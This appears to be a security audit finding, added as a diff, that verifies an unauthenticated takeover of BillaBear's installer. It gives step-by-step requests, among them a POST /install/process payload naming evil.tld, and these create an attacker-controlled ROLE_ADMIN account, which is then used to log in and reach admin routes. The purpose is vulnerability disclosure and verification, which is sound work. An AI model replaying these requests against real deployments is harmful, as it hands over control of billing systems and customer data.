@@ -1,0 +1,44 @@
+BILL-D2-01 — Unauthenticated POST /install/process creates attacker-controlled ROLE_ADMIN during the pre-install window
+Verdict: VERIFIED (end-to-end on the real deployment stack: PostgreSQL, as shipped in docker-compose).
+
+Environment: BillaBear at repos/billabear, composer install from lock (PHP 8.4.26), PostgreSQL 16.9
+(127.0.0.1:5433, fresh empty database billabear11), `php -S 127.0.0.1:8087 -t public public/index.php`, APP_ENV=prod.
+Environment-compat items only (documented; reverted after testing; none touch the audited code path):
+  - config/packages/cache.yaml: apcu/redis adapters -> array (no APCu/Redis on this Windows host)
+  - src/BillaBear/Database/Doctrine/TimescalePlatform.php: skip `create extension timescaledb` and
+    create_hypertable() calls (vanilla PostgreSQL 16 instead of the timescale/timescaledb docker image;
+    tables become regular tables)
+  - .env.local: DATABASE_URL points at local PG, MESSENGER_TRANSPORT_DSN auto_setup=1, MAILER_DSN=null://null
+
+Reproduction (all requests from curl with no cookies, no headers of interest):
+1) Precondition - fresh deployment window: GET /install on empty schema -> 200, renders the installer page
+   (index.html.twig), NOT a redirect to /login (installDefault()'s SettingsRepository probe throws
+   DoctrineTableException on the empty schema -> installer page, InstallController.php:39-50).
+2) Attack: POST /install/process
+   {"default_brand":"evilcorp","country":"US","from_email":"billing@evil.tld","timezone":"UTC",
+    "webhook_url":"https://evil.tld/hook","email":"attacker@evil.tld","password":"Passw0rd!x","currency":"USD"}
+   -> 200 [] (InstallController.php:57-105 ran the full install: serializer -> validator (shape only) ->
+   transactionManager -> createDbSchema (119 tables created) -> SystemSettingsStep/BrandStep/TemplateStep/DataStep
+   -> new User(attacker) setIsConfirmed(true) setRoles([ROLE_ADMIN]) -> save).
+   Database check: users = attacker@evil.tld | is_confirmed=t | roles=ROLE_ADMIN (only user in the instance).
+3) Session hijack: POST /app/authenticate {"username":"attacker@evil.tld","password":"Passw0rd!x"} (parthenon
+   json_login expects the username field; attacker-chosen email is the username) -> 200
+   {"id":"7dd27471-...","username":"attacker@evil.tld","roles":["ROLE_ADMIN"],"locale":"en"} + session cookie.
+4) Admin access: GET /app/customer with that session -> 200; control without session -> 401
+   (access_control ^/app/ requires ROLE_USER; ROLE_ADMIN implies it via role_hierarchy).
+
+Window-closed control (deterministic abort, as audited):
+   Repeating POST /install/process on the now-installed instance -> 500
+   {"message":"Schema-Tool failed ... 42P07: relation \"settings\" already exists"} - no second user is created
+   (users still contains only attacker@evil.tld). On installed instances the endpoint fails closed through the
+   schema exception; there is NO installed-state guard of its own (InstallController.php:57-105 has no
+   settings-existence check, unlike installDefault()).
+
+Note: on MySQL the install path is architecturally unsupported (platform_service TimescalePlatform extends
+PostgreSQLPlatform; transactional-DDL install aborts mid-way, e.g. "There is no active transaction" after the
+first DDL error), which is why the shipped docker stack (postgres+timescaledb) is the verification target.
+
+Impact: any network-reachable BillaBear deployment between first boot and operator install is taken over by one
+unauthenticated POST; the attacker becomes a confirmed ROLE_ADMIN of the billing platform (full customer PII,
+subscriptions, payment settings). On already-installed instances the endpoint remains exposed and unguarded but
+fails closed (schema exception).
